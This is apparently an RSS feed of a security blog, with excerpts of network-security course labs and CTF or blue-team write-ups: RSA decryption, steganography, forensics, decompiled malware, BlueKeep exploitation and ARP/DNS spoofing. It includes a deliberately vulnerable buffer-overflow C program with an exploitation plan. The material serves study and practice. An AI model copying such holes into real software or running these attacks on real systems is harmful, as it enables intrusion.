<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Securities :: SBK Hugo Site</title><link>https://bernie6401.github.io/security/index.html</link><description/><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/security/index.xml" rel="self" type="application/rss+xml"/><item><title>A&amp;D of Network Security - Lab 12</title><link>https://bernie6401.github.io/security/course/ntu-padns/ad-of-network-security---lab-12/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-padns/ad-of-network-security---lab-12/index.html</guid><description>A&amp;D of Network Security - Lab 12 tags: Practicum of A&amp;D of NS NTU Video NTU PADNS Lecture 12
Background What is _mbscmp?
int _mbscmp( const unsigned char *string1, const unsigned char *string2 ); Return Value
&lt;0 string1 is less than string2 =0 string1 is identical to string2 >0 string1 is greater than string2
Recon Static - IDA Pro :::spoiler Main Source Code
int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [esp+10h] [ebp-181Ch] char v5; // [esp+410h] [ebp-141Ch] char v6; // [esp+810h] [ebp-101Ch] char v7; // [esp+C10h] [ebp-C1Ch] CHAR v8; // [esp+1024h] [ebp-808h] CHAR ServiceName; // [esp+1428h] [ebp-404h] const char *v10; // [esp+1828h] [ebp-4h] if ( argc == 1 ) { if ( !sub_401000() ) sub_402410(); sub_402360(); } else { v10 = argv[argc - 1]; if ( !sub_402510(v10) ) sub_402410(); if ( _mbscmp((const unsigned __int8 *)argv[1], &amp;byte_40C170) ) { if ( _mbscmp((const unsigned __int8 *)argv[1], &amp;byte_40C16C) ) { if ( _mbscmp((const unsigned __int8 *)argv[1], &amp;byte_40C168) ) { if ( _mbscmp((const unsigned __int8 *)argv[1], aCc) ) sub_402410(); if ( argc != 3 ) sub_402410(); if ( !sub_401280(&amp;v5, 1024, &amp;v6, 1024, &amp;v4, 1024, &amp;v7) ) sub_402E7E(aKSHSPSPerS, &amp;v5); } else { if ( argc != 7 ) sub_402410(); sub_401070(argv[2], argv[3], argv[4], argv[5]); } } else if ( argc == 3 ) { if ( sub_4025B0(&amp;v8) ) return -1; sub_402900(&amp;v8); } else { if ( argc != 4 ) sub_402410(); sub_402900(argv[2]); } } else if ( argc == 3 ) { if ( sub_4025B0(&amp;ServiceName) ) return -1; sub_402600(&amp;ServiceName); } else { if ( argc != 4 ) sub_402410(); sub_402600(argv[2]); } } return 0; } :::</description></item><item><title>A&amp;D of Network Security - Lab 13</title><link>https://bernie6401.github.io/security/course/ntu-padns/ad-of-network-security---lab-13/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-padns/ad-of-network-security---lab-13/index.html</guid><description>A&amp;D of Network Security - Lab 13 tags: Practicum of A&amp;D of NS NTU Metasploit with Bluekeep Vulnerability (CVE-2019-0708) Setting up environment Open Windows 7 and Kali-Linux with localhost only mode :::spoiler Screenshot :::
Then we can note that the IP of these two machines are different: :::spoiler Screenshot</description></item><item><title>A&amp;D of Network Security - Lab 14</title><link>https://bernie6401.github.io/security/course/ntu-padns/ad-of-network-security---lab-14/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-padns/ad-of-network-security---lab-14/index.html</guid><description>A&amp;D of Network Security - Lab 14 tags: Practicum of A&amp;D of NS NTU Video Class Description Lab Implementation
Background snort Rule :::spoiler Rule Screenshot Format Action Option Option - Payload ::: Lab Lab 1: Packet sniffer Mode show出 sniff ICMP封包的結果 Payload:</description></item><item><title>A&amp;D of Network Security - Lab 2</title><link>https://bernie6401.github.io/security/course/ntu-padns/ad-of-network-security---lab-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-padns/ad-of-network-security---lab-2/index.html</guid><description>A&amp;D of Network Security - Lab 2 tags: Practicum of A&amp;D of NS NTU Lab Cheat Sheet(Cisco Packet Tracer) Setting VLAN :::spoiler Switch
Switch>enable Switch#configure Configuring from terminal, memory, or network [terminal]? Enter configuration commands, one per line. End with CNTL/Z. Switch(config)#vlan 10 Switch(config-vlan)#name green Switch(config-vlan)#vlan 20 Switch(config-vlan)#name yellow Switch(config-vlan)# Switch# %SYS-5-CONFIG_I: Configured from console by console Switch#show vlan VLAN Name Status Ports ---- -------------------------------- --------- ------------------------------- 1 default active Fa0/5, Fa0/6, Fa0/7, Fa0/8 Fa0/9, Fa0/10, Fa0/11, Fa0/12 Fa0/13, Fa0/14, Fa0/15, Fa0/16 Fa0/17, Fa0/18, Fa0/19, Fa0/20 Fa0/21, Fa0/22, Fa0/23, Fa0/24 Gig0/1, Gig0/2 10 green active 20 yellow active ... ::: :::spoiler Switch相對應的Interface</description></item><item><title>A&amp;D of Network Security - Lab 3</title><link>https://bernie6401.github.io/security/course/ntu-padns/ad-of-network-security---lab-3/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-padns/ad-of-network-security---lab-3/index.html</guid><description>A&amp;D of Network Security - Lab 3 tags: Practicum of A&amp;D of NS NTU Background Network setting type in virtual box Ping two machine in internal mode :::spoiler Detailed Process
Clone another VM Setting Network Configuration Setting 2 VMs’ network config as above. Note that, must check MAC address is different, promiscuous mode is Allow All and the adapter is the same.</description></item><item><title>A&amp;D of Network Security - Lab 4(ARP &amp; DNS SPOOFING)</title><link>https://bernie6401.github.io/security/course/ntu-padns/ad-of-network-security---lab-4arp--dns-spoofing/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-padns/ad-of-network-security---lab-4arp--dns-spoofing/index.html</guid><description>A&amp;D of Network Security - Lab 4(ARP &amp; DNS SPOOFING) tags: Practicum of A&amp;D of NS NTU Background ARP Spoofing at 1:15:00
ARP SPOOFING Setting 2 VMs’ network interface as Bridged adapter :::danger You supposed to use your own network instead of public network :::
Checking IP And check the victim gateway by nmap</description></item><item><title>A&amp;D of Network Security - Lab 7</title><link>https://bernie6401.github.io/security/course/ntu-padns/ad-of-network-security---lab-7/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-padns/ad-of-network-security---lab-7/index.html</guid><description>A&amp;D of Network Security - Lab 7 tags: Practicum of A&amp;D of NS NTU Background What is foremost and How to use it?
RSA CTF Exercise - RSA Given
p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483 q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407 e = 65537 c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034 Then I can use decrypt function to fetch plaintext. Flag(hex): 12058e43d9e0c22559c19774 :::spoiler source code
from Crypto.Util.number import long_to_bytes, inverse, bytes_to_long p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483 q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407 e = 65537 c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034 n = p * q phi = (q-1)*(p-1) d = inverse(e, phi) print(long_to_bytes(pow(c,d,n)).hex()) :::</description></item><item><title>A&amp;D of Network Security Note</title><link>https://bernie6401.github.io/security/course/ntu-padns/ad-of-network-security-note/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-padns/ad-of-network-security-note/index.html</guid><description>A&amp;D of Network Security Note tags: Practicum of A&amp;D of NS NTU Background :::spoiler IP / 遮罩 / 閘道 三者的關係
用日常生活中的例子來比喻，IP 就好比在社區中的門牌地址，如果是要找同社區(一樣遮罩範圍的)，就只要透過社區廣播喊一聲。如果找不到人，表示在社區外，就要出社區大門(閘道)去外面問
所以遮罩設定錯誤，代表硬把兩個不同社區的給劃在一起，但是實際上遞送封包就會找不到 (明明住光復國宅結果你跟郵差說光復國宅跟孟竹國宅都在一區)
閘道設定錯誤則是連大門都搞錯了，這樣蓮社區都出不去，自然網路也無法連線 :::
:::spoiler [網路] 淺談 ARP (Address Resolution Protocol) 運作原理
在乙太網路上，資料的傳遞必須要有實體位址 (MAC Address)，Layer 2 設備會驗證 Frame 的實體位址，不是找它的一律捨棄，但設備一開機總不可能就有所有設備的實體位址吧？所以就需要 ARP 協定來協助取得各個設備的實體位址
ARP 是利用乙太網路的廣播功能所設計出來的位址解析協定，它的主要特性是它的位址對應關係是動態的，以查詢的方式來獲得 I P位址 (IP Address) 和實體位址 (MAC Address / Physical Address) 的對應關係。
只要是 Layer 3 的設備都一定會有 ARP Cache，並且會在 ARP 快取內建立 ARP 表格 (ARP Table) 用來記錄 IP 位址和實體位址的對應關係。這個 Table 會依據自身的存活時間遞減而消失，以確保資料的正確性。</description></item><item><title>Adworld - 3-1</title><link>https://bernie6401.github.io/security/practice/adworld/misc/adworld---3-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/adworld/misc/adworld---3-1/index.html</guid><description>Adworld - 3-1 Recon 這一題很簡單，和之前幾題有點像
用file看一下給的檔案是一個.rar壓縮檔，改個副檔名後解壓縮出現另外一個檔案 再用file看一下是一個pcapng檔案，用wireshark分析 用一些基本的技巧(Follow TCP Stream/Extract Object…)看tcp stream，會發現一個bash的command紀錄，有一個python enc/dec flow，和一串base64的string，除此之外還可以用extract object把一些file dump下來，發現是另外一個加密的flag.rar檔案，我們的任務就是要從這個pcapng檔案中把加密的密碼找出來 用python腳本解密base64 string，會輸出b'passwd={No_One_Can_Decrypt_Me}\x00\x00' 解密壓縮檔flag就出來了 Exploit Write Byte Data
from base64 import b64decode import zipfile f = open('./basezip.txt', 'r').read().split(',')[-1] f1 = open('./cipher.zip', 'wb') f1.write(b64decode(f)) print(bytes.fromhex(b64decode(f).hex()).decode('cp437')) f1.close() Decrypt Part
from Crypto.Cipher import AES import base64 IV = b'QWERTYUIOPASDFGH' str1 = '19aaFYsQQKr+hVX6hl2smAUQ5a767TsULEUebWSajEo=' def decrypt(encrypted): aes = AES.new(IV, AES.MODE_CBC, IV) return aes.decrypt(encrypted) def encrypt(message): length = 16 count = len(message) padding = length - (count % length) message = message + '\0' * padding aes = AES.new(IV, AES.MODE_CBC, IV) return aes.encrypt(message) str = 'this is a test' example = decrypt(base64.b64decode(str1)) print(example) Reference 【攻防世界AD】Misc进阶区：3-1</description></item><item><title>Adworld - miao~</title><link>https://bernie6401.github.io/security/practice/adworld/misc/adworld---miao~/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/adworld/misc/adworld---miao~/index.html</guid><description>Adworld - miao~ Recon 這題也是看了別人的WP1和官解
Exploit 用foremost搜索或救援檔案(神奇的解法，一開始完全想不到)
$ foremost -v miao\~.jpg Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus Audit File Foremost started at Sat Jul 15 15:21:29 2023 Invocation: foremost -v miao~.jpg Output directory: /home/sbk6401/CTF/Adworld/Misc/miao~/output Configuration file: /etc/foremost.conf Processing: miao~.jpg |------------------------------------------------------------------ File: miao~.jpg Start: Sat Jul 15 15:21:29 2023 Length: 1 MB (1242752 bytes) Num Name (bs=512) Size File Offset Comment 0: 00000000.jpg 55 KB 0 1: 00000111.wav 1 MB 57212 *| Finish: Sat Jul 15 15:21:29 2023 2 FILES EXTRACTED jpg:= 1 rif:= 1 ------------------------------------------------------------------ Foremost finished at Sat Jul 15 15:21:29 2023 可以看到抓到其中有一個.wav檔案</description></item><item><title>Adworld - Misc文件類型</title><link>https://bernie6401.github.io/security/practice/adworld/misc/adworld---misc%E6%96%87%E4%BB%B6%E9%A1%9E%E5%9E%8B/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/adworld/misc/adworld---misc%E6%96%87%E4%BB%B6%E9%A1%9E%E5%9E%8B/index.html</guid><description>Adworld - Misc文件類型 Source Code 3436455341425F554573444242514141 41414941416C64434658714F7737634B 4141414143594141414149414141415A 6D78685A7935306548524C79306C4D72 7A5A49536B303253457778546B6B304D 6A5130546A593353445531534573784E 544D3054374A494E552B7A7241554155 45734241685141464141414141674143 56304956656F374474776F414141414A 674141414167414A4141414141414141 414167414141414141414141475A7359 57637564486830436741674141414141 41414241426741477845666B39697132 41456245522B54324B725941514A462B 34725971746742554573464267414141 41414241414541576741414145344141 4141414141 Recon 這一題有一點通靈，沒有很喜歡
首先給的cipher很明顯是ascii的hex 轉換過後也很明顯是base64 在轉換過後，只有底線後面的部分要轉換成hex 如果把東西print出來的話會看到flag.txt的字樣，感覺上是一個file的byte code，到file signature去看會發現magic header是一個zip file，uncompress之後就會發現flag.txt Exploit import base64 cipher = "3436455341425F55457344424251414141414941416C64434658714F7737634B4141414143594141414149414141415A6D78685A7935306548524C79306C4D727A5A49536B303253457778546B6B304D6A5130546A593353445531534573784E544D3054374A494E552B7A72415541554573424168514146414141414167414356304956656F374474776F414141414A674141414167414A4141414141414141414167414141414141414141475A73595763756448683043674167414141414141414241426741477845666B3969713241456245522B54324B725941514A462B34725971746742554573464267414141414142414145415767414141453441414141414141" cipher = bytes.fromhex(cipher).decode('utf-8').split("_")[1] cipher = base64.b64decode(cipher + "==") f = open("./cipher.zip", "wb") f.write(cipher) f.close() import zipfile with zipfile.ZipFile('./cipher.zip', 'r') as zip_ref: zip_ref.extractall('./') f = open('./flag.txt', 'r').read() print(f) $ python exp.py flag{0bec0ad3da2113c70e50fd5617b8e7f9} Reference XCTF-MISC-Misc文件類型</description></item><item><title>Adworld - pure_color</title><link>https://bernie6401.github.io/security/practice/adworld/misc/adworld---pure_color/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/adworld/misc/adworld---pure_color/index.html</guid><description>Adworld - pure_color tags: Adworld CTF Misc Challenge: https://adworld.xctf.org.cn/challenges/details?hash=f216ffab-e01d-46b8-9d4d-d91ab5229eed_2&amp;task_category_id=1
Background 【Day21】隱寫技術 Steganography 图片隐写查看神器stegsolve使用方法 zardus/ctf-tools - stegsolve
Exploit - Basic Steganography</description></item><item><title>Adworld - 心儀的公司</title><link>https://bernie6401.github.io/security/practice/adworld/misc/adworld---%E5%BF%83%E5%84%80%E7%9A%84%E5%85%AC%E5%8F%B8/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/adworld/misc/adworld---%E5%BF%83%E5%84%80%E7%9A%84%E5%85%AC%E5%8F%B8/index.html</guid><description>Adworld - 心儀的公司 tags: Adworld CTF Misc Challenge: https://adworld.xctf.org.cn/challenges/details?hash=ed5d10bf-be47-4e61-b04e-3a9ccb73ff95_2&amp;task_category_id=1
Exploit $ strings webshell.pcapng | grep "{" ... fl4g:{ftop_Is_Waiting_4_y} Reference 心仪的公司writeup 【CTF视频合辑】MISC-流量分析题大集合(第一辑)</description></item><item><title>Adworld - 適合作為桌面</title><link>https://bernie6401.github.io/security/practice/adworld/misc/adworld---%E9%81%A9%E5%90%88%E4%BD%9C%E7%82%BA%E6%A1%8C%E9%9D%A2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/adworld/misc/adworld---%E9%81%A9%E5%90%88%E4%BD%9C%E7%82%BA%E6%A1%8C%E9%9D%A2/index.html</guid><description>Adworld - 適合作為桌面 tags: Adworld CTF Misc Challenge: 適合作為桌面
Background Day8 Python基礎-pyc是什麼
Exploit Analyze Steganography QR Code Reader
03F30D0A79CB05586300000000000000000100000040000000730D0000006400008400005A000064010053280200000063000000000300000016000000430000007378000000640100640200640300640400640500640600640700640300640800640900640A00640600640B00640A00640700640800640C00640C00640D00640E00640900640F006716007D00006410007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100715500577C010047486400005328110000004E6966000000696C00000069610000006967000000697B000000693300000069380000006935000000693700000069300000006932000000693400000069310000006965000000697D000000740000000028010000007403000000636872280300000074030000007374727404000000666C6167740100000069280000000028000000007304000000312E7079520300000001000000730A0000000001480106010D0114014E280100000052030000002800000000280000000028000000007304000000312E707974080000003C6D6F64756C653E010000007300000000 It seems a byte code of a file.
HxD It can be disassembled by pyc tools.
pyc disassemble :::spoiler
def flag(): str = [ 102, 108, 97, 103, 123, 51, 56, 97, 53, 55, 48, 51, 50, 48, 56, 53, 52, 52, 49, 101, 55, 125, ] flag = "" for i in str: flag += chr(i) print flag :::</description></item><item><title>AIS3 EOF 2023 初賽</title><link>https://bernie6401.github.io/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/index.html</guid><description>AIS3 EOF 2023 初賽 PWN real_rop Description Challenge URL
Folder structure:
Share ├── share │ ├── chal │ ├── flag │ ├── Makefile │ ├── real_rop++.c │ └── run.sh ├── docker-compose.yaml ├── Dockerfile └── xinetd Original Code #include &lt;unistd.h> int main() { char buf[0x10]; read(0, buf, 0x30); write(1, buf, 0x30); return 0; } gcc -fno-stack-protector -o chal real_rop++.c Obviously buffer overflow but not much Preliminary idea is one_gadget Check protector $ checksec chal [*] '/home/sbk6401/CTF/AIS3/PWN/real_rop/share/chal' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled PIE is enabled → use write function to leak libc address Full RELRO → cannot use GOT hijacking Refer to 大神write up, we cannot leak libc address and get shell at one time. So, we can control $rip and return to the beginning of main function and go through the process again. That is, we have another read function to fill in one_gadget. Note that, the version of Ubuntu and Glibc is VERY VERY important, according to Dockerfile, it seems use Ubuntu 20.04 with default FROM ubuntu:20.04 MAINTAINER u1f383 RUN apt-get update &amp;&amp; \ DEBAIN_FRONTEND=noninteractive apt-get install -qy xinetd RUN useradd -m chal RUN chown -R root:root /home/chal RUN chmod -R 755 /home/chal CMD ["/usr/sbin/xinetd", "-dontfork"] Analyze where to return For Ubuntu 22.04 &amp;　GLIBC 2.35 - back to __libc_start_main+121</description></item><item><title>AIS3 EOF 2024</title><link>https://bernie6401.github.io/security/competition/ais3-eof-2024/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/competition/ais3-eof-2024/index.html</guid><description>AIS3 EOF 2024 Crypto Baby RSA Source Code :::spoiler Source Code
#! /usr/bin/python3 from Crypto.Util.number import bytes_to_long, long_to_bytes, getPrime import os from secret import FLAG def encrypt(m, e, n): enc = pow(bytes_to_long(m), e, n) return enc def decrypt(c, d, n): dec = pow(c, d, n) return long_to_bytes(dec) if __name__ == "__main__": while True: p = getPrime(1024) q = getPrime(1024) n = p * q phi = (p - 1) * (q - 1) e = 3 if phi % e != 0 : d = pow(e, -1, phi) break print(f'{p=}, {q=}') print(f"{n=}, {e=}") print("FLAG: ", encrypt(FLAG, e, n)) for _ in range(3): try: c = int(input("Any message for me?")) m = decrypt(c, d, n) print("How beautiful the message is, it makes me want to destroy it .w.") new_m = long_to_bytes(bytes_to_long(m) ^ bytes_to_long(os.urandom(8))) print( "New Message: ", encrypt(new_m, e, n) ) except: print("?") exit() :::</description></item><item><title>AIS3 Pre-Exam 2023</title><link>https://bernie6401.github.io/security/competition/ais3-pre-exam-2023/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/competition/ais3-pre-exam-2023/index.html</guid><description>AIS3 Pre-Exam 2023 tags: CTF EOF2023 :::spoiler TOC [TOC] :::
Web E-Portfolio baby Recon 直接用Burp Suite可以繞過reCAPTCHA，而且About Guest的內容會被完整的render出來達到XSS
Login Panel Recon 我又找到了一個破解谷歌驗證碼的新方案！ yescaptcha Reverse Pwn Simply Pwn Recon checksec $ checksec pwn [*] Checking for new versions of pwntools To disable this functionality, set the contents of /home/sbk6401/.cache/.pwntools-cache-3.7/update to 'never' (old way). Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide): [update] interval=never [*] You have the latest version of Pwntools (4.9.0) [*] '/home/sbk6401/CTF/AIS3-Pre-Exam/PWN/Simply Pwn/pwn' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Misc Welcome 縮小檔案就看的到flag了 Flag: AIS3{WELCOME-TO-2023-PRE-EXAM-&amp;-MY-FIRST-CTF}</description></item><item><title>Background</title><link>https://bernie6401.github.io/security/practice/nisra/misc/nisra---%E7%9C%8B%E4%B8%8D%E8%A6%8B%E7%9A%84%E5%9C%B0%E6%96%B9/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/nisra/misc/nisra---%E7%9C%8B%E4%B8%8D%E8%A6%8B%E7%9A%84%E5%9C%B0%E6%96%B9/index.html</guid><description>NISRA - 看不見的地方 Background advanced-potion-making:two::+1:
Recon 這題出的不錯，我用了所有方法都沒看到甚麼奇怪的東西，除了pngcheck
$ pngcheck flag.png flag.png CRC error in chunk IHDR (computed 68ff0ded, expected 8c5880da) ERROR: flag.png 代表檔案可能有一些問題 原圖： Exploit - Recover PNG File 參考UP主的腳本，可以直接寫出長寬
import zlib import struct import sys filename = sys.argv[1] with open(filename, 'rb') as f: all_b = f.read() crc32key = int(all_b[29:33].hex(),16) data = bytearray(all_b[12:29]) n = 4095 for w in range(n): width = bytearray(struct.pack('>i', w)) for h in range(n): height = bytearray(struct.pack('>i', h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = zlib.crc32(data) if crc32result == crc32key: print("寬為：{}(hex), {}(int)".format(width.hex(), int(width.hex(), 16))) print("高為：{}(hex), {}(int)".format(height.hex(), int(height.hex(), 16))) exit(0) $ python exp.py flag.png 寬為：00000258(hex), 600(int) 高為：00000148(hex), 328(int) 可以看得出來高的數值不一樣</description></item><item><title>BalsnCTF 2023</title><link>https://bernie6401.github.io/security/competition/balsnctf-2023/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/competition/balsnctf-2023/index.html</guid><description>BalsnCTF 2023 Reverse Lucky Source code :::spoiler IDA Main Function
__int64 main_fn() { __int64 idx; // r15 int v1; // ebp __int64 v2; // rbx unsigned __int64 v3; // r14 int v4; // r9d int v5; // r9d char v6; // al __int64 v7; // rdx unsigned int v9; // [rsp+Ch] [rbp-9Ch] BYREF char v10[32]; // [rsp+10h] [rbp-98h] BYREF __int128 user_input[2]; // [rsp+30h] [rbp-78h] BYREF __int64 v12; // [rsp+50h] [rbp-58h] char v13; // [rsp+58h] [rbp-50h] unsigned __int64 v14; // [rsp+68h] [rbp-40h] idx = 10000000000000000LL; v1 = 0; v14 = __readfsqword(0x28u); v2 = sub_40C2B0("/dev/urandom", &amp;unk_498004); do { sub_40C3B0(&amp;v9, 4uLL, 1LL, v2); v3 = v9 % 100000000uLL; sub_40C3B0(&amp;v9, 4uLL, 1LL, v2); v1 -= (v3 * v3 + v9 % 100000000uLL * (v9 % 100000000uLL) > 9999999999999999LL) - 1; --idx; } while ( idx ); sub_44A050(v10, 1u, 30LL, "%lu", 4 * v1 - 0x4F430000, v4); v13 = 0; v6 = 0x73; v12 = 0LL; memset(user_input, 0, sizeof(user_input)); while ( 1 ) { v7 = idx &amp; 0xF; *(user_input + idx++) = v10[v7] ^ v6; if ( idx == 40 ) break; v6 = byte_498040[idx]; } if ( LOBYTE(user_input[0]) == 'B' &amp;&amp; *(user_input + 1) == 'NSLA' &amp;&amp; BYTE5(user_input[0]) == '{' &amp;&amp; HIBYTE(v12) == '}' ) sub_44A130(1, "Lucky! flag is %s\n", user_input, byte_498040, user_input, v5); else (sub_40C4B0)("Not so lucky ...", 1LL, v7, byte_498040, user_input); if ( v14 != __readfsqword(0x28u) ) (sub_44A220)(); return 0LL; } :::</description></item><item><title>BTLO - Bruteforce</title><link>https://bernie6401.github.io/security/practice/btlo/incident-response/btlo---bruteforce/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/btlo/incident-response/btlo---bruteforce/index.html</guid><description>BTLO - Bruteforce Challenge: https://blueteamlabs.online/home/challenge/bruteforce-16629bf9a2
:::spoiler TOC [TOC] :::
Scenario Can you analyze logs from an attempted RDP bruteforce attack?
One of our system administrators identified a large number of Audit Failure events in the Windows Security Event log.
There are a number of different ways to approach the analysis of these logs! Consider the suggested tools, but there are many others out there!
==Q1== How many Audit Failure events are there? (Format: Count of Events)</description></item><item><title>BTLO - Follina</title><link>https://bernie6401.github.io/security/practice/btlo/incident-response/btlo---follina/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/btlo/incident-response/btlo---follina/index.html</guid><description>BTLO - Follina Challenge: https://blueteamlabs.online/home/challenge/follina-f1a3452f34
:::spoiler TOC [TOC] ::: :::danger 因為給予的題目是真實的樣本，所以盡量在乾淨的環境或是reliable的sandbox進行測試 :::
Scenario On a Friday evening when you were in a mood to celebrate your weekend, your team was alerted with a new RCE vulnerability actively being exploited in the wild. You have been tasked with analyzing and researching the sample to collect information for the weekend team.
Tools VirusTotal Any.Run OSINT
==Q1== What is the SHA1 hash value of the sample? (Format: SHA1Hash)</description></item><item><title>BTLO - Log Analysis -Compromised WordPress</title><link>https://bernie6401.github.io/security/practice/btlo/incident-response/btlo---log-analysis--compromised-wordpress/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/btlo/incident-response/btlo---log-analysis--compromised-wordpress/index.html</guid><description>BTLO - Log Analysis -Compromised WordPress Challenge: https://blueteamlabs.online/home/challenge/log-analysis-compromised-wordpress-ce000f5b59
:::spoiler TOC [TOC] :::
Scenario One of our WordPress sites has been compromised but we’re currently unsure how. The primary hypothesis is that an installed plugin was vulnerable to a remote code execution vulnerability which gave an attacker access to the underlying operating system of the server.
Tools Grep Sort Uniq Apache Log Analyzer
==Q1== Identify the URI of the admin login panel that the attacker gained access to (include the token)</description></item><item><title>BTLO - Meta</title><link>https://bernie6401.github.io/security/practice/btlo/digital-forensic/btlo---meta/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/btlo/digital-forensic/btlo---meta/index.html</guid><description>BTLO - Meta Challenge: https://blueteamlabs.online/home/challenge/meta-b976cec9e2
:::spoiler TOC [TOC] :::
Scenario The attached images were posted by a criminal on the run, with the caption “I’m roaming free. You will never catch me”. We believe you can assist us in proving him wrong.
==Q1== What is the camera model?
Recon 問有關圖片相關的forensics直覺就是利用exiftool幫忙parse其中的內容，之後再慢慢extract出有用的資訊，或是直接丟到chatgpt幫忙extract問題的答案
Exploit $ sudo apt install exiftool -y $ exiftool uploaded_1.JPG > uploaded1_exiftool.txt $ exiftool uploaded_2.png > uploaded2_exiftool.txt chatgpt紀錄</description></item><item><title>BTLO - Paranoid</title><link>https://bernie6401.github.io/security/practice/btlo/incident-response/btlo---paranoid/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/btlo/incident-response/btlo---paranoid/index.html</guid><description>BTLO - Paranoid Challenge: https://blueteamlabs.online/home/challenge/paranoid-e5e164befb
:::spoiler TOC [TOC] ::: :::info 此lab大部分是參考1的說明，因為本身第一次接觸aureport，所以不太清楚指令或者是注意的地方 :::
Tool AUReport: $ sudo apt install auditd Linux CLI
Background aureport --help usage: aureport [options] -a,--avc Avc report -au,--auth Authentication report --comm Commands run report -c,--config Config change report -cr,--crypto Crypto report --debug Write malformed events that are skipped to stderr --eoe-timeout secs End of Event Timeout -e,--event Event report --escape option Escape output -f,--file File name report --failed only failed events in report -h,--host Remote Host name report --help help -i,--interpret Interpretive mode -if,--input &lt;Input File name> use this file as input --input-logs Use the logs even if stdin is a pipe --integrity Integrity event report -k,--key Key report -l,--login Login report -m,--mods Modification to accounts report -ma,--mac Mandatory Access Control (MAC) report -n,--anomaly aNomaly report -nc,--no-config Don''t include config events --node &lt;node name> Only events from a specific node -p,--pid Pid report -r,--response Response to anomaly report -s,--syscall Syscall report --success only success events in report --summary sorted totals for main object in report -t,--log Log time range report -te,--end [end date] [end time] ending date &amp; time for reports -tm,--terminal TerMinal name report -ts,--start [start date] [start time] starting data &amp; time for reports --tty Report about tty keystrokes -u,--user User name report -v,--version Version --virt Virtualization report -x,--executable eXecutable name report If no report is given, the summary report will be displayed</description></item><item><title>BTLO - Phishing Analysis</title><link>https://bernie6401.github.io/security/practice/btlo/security-operation/btlo---phishing-analysis/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/btlo/security-operation/btlo---phishing-analysis/index.html</guid><description>BTLO - Phishing Analysis Challenge: https://blueteamlabs.online/home/challenge/phishing-analysis-f92ef500ce
:::spoiler TOC [TOC] :::
